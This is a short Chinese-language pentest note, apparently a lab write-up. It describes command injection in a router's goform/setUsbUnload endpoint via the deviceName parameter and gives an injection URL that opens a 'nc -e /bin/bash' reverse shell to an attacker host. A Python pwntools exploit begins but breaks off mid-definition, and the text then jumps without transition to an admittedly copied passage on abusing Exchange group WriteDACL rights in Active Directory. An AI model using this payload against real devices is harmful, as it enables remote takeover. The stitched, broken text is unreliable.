这个漏洞点在于goform/setUnload断点允许远程攻击者通过deviceName POST参数执行任意系统命令。利用的话，我们既可以通过url的拼接直接搞定，也可以通过脚本来上线。

http://10.30.0.187:60080/goform/setUsbUnload/?deviceName=;%20wget%20`nc -e /bin/bash 10.30.2.42 7777` 
#!/usr/bin/python3

from pwn import *
import requests
from threading import Thread

header = {

*Exchange Servers
*Exchange Trusted Subsystem
*Exchange Windows Permissions

这个EXCHANGE$就是当前exchang机器的机器用户，而有这个用户的权限是用户组的WriteDACL权限，WriteDACL权限可以修改域对象的ACL，允许委托人修改受影响对象的DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。（抄的，没咋看懂，test是师傅加进去的域账号）
